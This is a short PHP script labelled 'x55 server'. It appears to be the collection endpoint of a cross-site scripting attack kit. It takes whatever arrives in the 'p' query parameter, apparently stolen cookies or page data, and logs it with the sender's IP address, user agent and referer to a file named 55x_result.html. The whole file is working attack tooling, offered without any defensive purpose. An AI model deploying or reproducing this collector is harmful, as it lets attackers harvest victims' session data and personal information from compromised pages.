<?php
/*
Author : Who care
Date : 6/8/2013
Version : 0.1
Desc : x55 server
*/

@header("Content:text/html;charset=utf-8");
echo "123";

function get_Ip(){
  $ip=false;
  if(!empty($_SERVER["HTTP_CLIENT_IP"]))
  {
    $ip=$_SERVER["HTTP_CLIENT_IP"];
  }
  else{
    $ip = empty($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['REMOTE_ADDR'] : $_SERVER['HTTP_X_FORWARDED_FOR'];
  }
  return $ip;
}

function get_UserAgent(){
  return $_SERVER['HTTP_USER_AGENT'];
}

function get_Referer(){
  $refer=$_SERVER['HTTP_REFERER'];
  return $refer;

}

function quotes($content)
{
  if(get_magic_quotes_gpc())
  {
      if(is_array($content))
	  {
	      foreach($content as $key=>$value){
		      $content[$key]=stripslashes($value);
		  }
	  }
	   else
	   {
	      $content=stripslashes($content);
		  
	   }
  }
  else{
  }
  return $content;
}

if(!empty($_GET['p'])){
	
  $curtime=date("Y-m-d H:i:s");
  $ip=get_Ip();
  $useragent=get_UserAgent();
  $referer=get_Referer();
  $data=$_GET['p'];

  if(!file_exists("55x_result.html")){
      $fp=fopen("55x_result.html","a+");
	  fwrite($fp,'<head><meta http-equiv="Content-Type" content="text/html";charset=utf-8/><title>55X Result</title></head>');
	  fclose($fp);
	  }
	  $fp=fopen("55x_result.html","a+");
	  fwrite($fp,"$ip | $curtime<br />UserAgent: ".htmlspecialchars(quotes($useragent))."<br />Referer: ".htmlspecialchars(quotes($referer))."<br />);DATA : ".htmlspecialchars(quotes($data))."<br /><br />");
	  fclose($fp);
	 }
?>